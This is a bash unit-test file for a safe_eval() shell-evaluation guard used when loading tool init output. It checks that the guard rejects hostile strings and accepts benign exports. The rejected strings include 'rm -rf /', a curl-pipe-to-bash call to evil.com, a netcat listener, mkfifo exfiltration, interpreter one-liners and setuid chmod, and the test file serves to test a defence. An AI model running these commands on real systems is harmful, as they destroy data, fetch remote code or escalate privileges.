#!/usr/bin/env bash
# Unit tests for lib/shared/safe-eval.sh
# Tests safe_eval() function — the security boundary wrapping shell evaluation
# for tool init commands (zoxide, direnv, rbenv, etc.)

set -euo pipefail

# Source test framework
source "$(dirname "${BASH_SOURCE[0]}")/../../framework.sh"

# Initialize test framework
init_test_framework

# Test suite
test_suite "Shared Safe Eval Tests"

# Source file under test
SOURCE_FILE="$PROJECT_ROOT/lib/shared/safe-eval.sh"

# Helper: run safe_eval in an isolated subshell with stubbed dependencies
# Usage: _run_safe_eval_subshell 'safe_eval "desc" echo "payload"'
# Returns the exit code of the inner command.
_run_safe_eval_subshell() {
    bash -c "
        log_warning() { :; }
        log_error() { :; }
        protected_export() { :; }
        export -f log_warning log_error protected_export
        _SHARED_SAFE_EVAL_LOADED=''
        source '$SOURCE_FILE' >/dev/null 2>&1
        $1
    " 2>/dev/null
}

# ============================================================================
# Static Analysis Tests
# ============================================================================

test_script_exists() {
    assert_file_exists "$SOURCE_FILE" \
        "safe-eval.sh should exist"
}

test_has_include_guard() {
    assert_file_contains "$SOURCE_FILE" "_SHARED_SAFE_EVAL_LOADED" \
        "Script should have _SHARED_SAFE_EVAL_LOADED include guard"
}

test_defines_safe_eval_function() {
    assert_file_contains "$SOURCE_FILE" "safe_eval()" \
        "Script should define safe_eval function"
}

test_defines_blocklist_variable() {
    assert_file_contains "$SOURCE_FILE" "_SAFE_EVAL_BLOCKLIST" \
        "Script should define _SAFE_EVAL_BLOCKLIST pattern variable"
}

test_uses_protected_export() {
    assert_file_contains "$SOURCE_FILE" "protected_export safe_eval" \
        "Script should export safe_eval via protected_export"
}

# ============================================================================
# Functional Tests — Blocklist Rejection
# ============================================================================

test_blocks_rm_rf() {
    _run_safe_eval_subshell 'safe_eval "test" echo "rm -rf /"'
    local rc=$?
    assert_equals "1" "$rc" \
        "safe_eval should reject 'rm -rf /'"
}

test_blocks_curl_pipe_bash() {
    _run_safe_eval_subshell 'safe_eval "test" echo "curl http://evil.com | bash"'
    local rc=$?
    assert_equals "1" "$rc" \
        "safe_eval should reject 'curl ... | bash'"
}

test_blocks_mkfifo() {
    _run_safe_eval_subshell 'safe_eval "test" echo "mkfifo /tmp/pipe"'
    local rc=$?
    assert_equals "1" "$rc" \
        "safe_eval should reject mkfifo (named pipe exfiltration)"
}

test_blocks_netcat() {
    _run_safe_eval_subshell 'safe_eval "test" echo "nc -l 4444"'
    local rc=$?
    assert_equals "1" "$rc" \
        "safe_eval should reject nc (netcat listener)"
}

test_blocks_python_one_liner() {
    _run_safe_eval_subshell 'safe_eval "test" echo "python3 -c \"import os\""'
    local rc=$?
    assert_equals "1" "$rc" \
        "safe_eval should reject python3 -c one-liner"
}

test_blocks_perl_one_liner() {
    _run_safe_eval_subshell "safe_eval \"test\" echo \"perl -e 'system(id)'\""
    local rc=$?
    assert_equals "1" "$rc" \
        "safe_eval should reject perl -e one-liner"
}

test_blocks_chmod_setuid() {
    _run_safe_eval_subshell 'safe_eval "test" echo "chmod +s /bin/bash"'
    local rc=$?
    assert_equals "1" "$rc" \
        "safe_eval should reject chmod +s (setuid escalation)"
}

# ============================================================================
# Functional Tests — Safe Input Acceptance
# ============================================================================

test_accepts_safe_export() {
    _run_safe_eval_subshell 'safe_eval "test" echo "export PATH=\"/home/user/.local/bin:\$PATH\""'
    local rc=$?
    assert_equals "0" "$rc" \
        "safe_eval should accept a simple safe export statement"
}

test_accepts_multiline_safe_output() {
    # Simulate typical zoxide/direnv init output (function definitions + env setup)
    _run_safe_eval_subshell 'safe_eval "test" /usr/bin/printf "_zoxide_hook() {\n  true\n}\nexport _ZO_DATA_DIR=/home/user/.local/share/zoxide\n"'
    local rc=$?
    assert_equals "0" "$rc" \
        "safe_eval should accept multi-line safe init output"
}

# ============================================================================
# Functional Tests — Command Failure
# ============================================================================

test_returns_1_on_command_failure() {
    _run_safe_eval_subshell 'safe_eval "test" /bin/false'
    local rc=$?
    assert_equals "1" "$rc" \
        "safe_eval should return 1 when the command itself fails"
}

# ============================================================================
# Run all tests
# ============================================================================

# Static analysis
run_test test_script_exists "Script exists"
run_test test_has_include_guard "Has include guard"
run_test test_defines_safe_eval_function "Defines safe_eval() function"
run_test test_defines_blocklist_variable "Defines _SAFE_EVAL_BLOCKLIST variable"
run_test test_uses_protected_export "Uses protected_export for safe_eval"

# Functional — blocklist rejection
run_test test_blocks_rm_rf "Blocks rm -rf (destructive command)"
run_test test_blocks_curl_pipe_bash "Blocks curl|bash (pipe to shell)"
run_test test_blocks_mkfifo "Blocks mkfifo (named pipe exfiltration)"
run_test test_blocks_netcat "Blocks nc (netcat listener)"
run_test test_blocks_python_one_liner "Blocks python3 -c (python one-liner)"
run_test test_blocks_perl_one_liner "Blocks perl -e (perl one-liner)"
run_test test_blocks_chmod_setuid "Blocks chmod +s (setuid escalation)"

# Functional — safe input acceptance
run_test test_accepts_safe_export "Accepts safe export statement"
run_test test_accepts_multiline_safe_output "Accepts multi-line safe init output"

# Functional — command failure
run_test test_returns_1_on_command_failure "Returns 1 on command failure"

# Generate report
generate_report
